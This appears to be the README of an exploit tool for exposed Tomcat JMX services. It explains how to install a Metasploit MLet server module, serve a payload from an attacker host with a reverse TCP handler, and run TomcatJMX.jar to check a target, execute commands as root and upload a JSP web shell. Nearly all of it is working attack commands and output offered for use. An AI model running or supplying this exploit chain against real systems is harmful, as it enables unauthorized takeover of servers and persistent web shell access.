### INSTALL   
- Copy the "metasploit" folder to "data/java/"  
- Copy java_mlet_server.rb to "modules/exploits/multi/misc/"  
  
### START MLET SERVER  
  
msf > use exploit/multi/misc/java_mlet_server   
msf exploit(multi/misc/java_mlet_server) > set SRVHOST 192.168.153.144  
SRVHOST => 192.168.153.144  
msf exploit(multi/misc/java_mlet_server) > set URIPATH /pwn/  
URIPATH => /pwn/  
msf exploit(multi/misc/java_mlet_server) > run  
WARNING: Local file /usr/share/metasploit-framework/data/java is being used  
WARNING: Local files may be incompatible with the Metasploit Framework  
[*] Exploit running as background job 0.  
  
[*] Started reverse TCP handler on 192.168.153.144:4444   
[*] Using URL: http://192.168.153.144:8080/pwn/  
[*] Server started.  
msf exploit(multi/misc/java_mlet_server) >   
  
  
### USAGE  
  
D:\>java -jar TomcatJMX.jar  
  
Usage:  java -jar jmx_echo.jar <url> <ip:port> check  
        java -jar jmx_echo.jar <url> <ip:port> run <cmd>  
        java -jar jmx_echo.jar <url> <ip:port> upload <local_file> <remote_file>  
  
  
D:\>java -jar TomcatJMX.jar http://192.168.153.144:8080/pwn/ 192.168.153.100:9999 check  
###VULNERABLE###  
  
D:\>java -jar TomcatJMX.jar http://192.168.153.144:8080/pwn/ 192.168.153.100:9999 run id  
uid=0(root) gid=0(root) groups=0(root)  
  
  
D:\>java -jar TomcatJMX.jar http://192.168.153.144:8080/pwn/ 192.168.153.100:9999 upload d:/func.jsp /tmp/xxx.jsp  
BINGO  
  
D:\>java -jar TomcatJMX.jar http://192.168.153.144:8080/pwn/ 192.168.153.100:9999 run "head -10 /tmp/xxx.jsp"  
<%@page import="java.security.MessageDigest,  
                java.util.*,  
                java.net.*,  
                java.text.*,  
                java.util.zip.*,  
                java.io.*"  
%>  
<%!  
  private static final boolean NATIVE_COMMANDS = true;  
        private static final boolean READ_ONLY = false;  
  
  
D:\>  
  
  
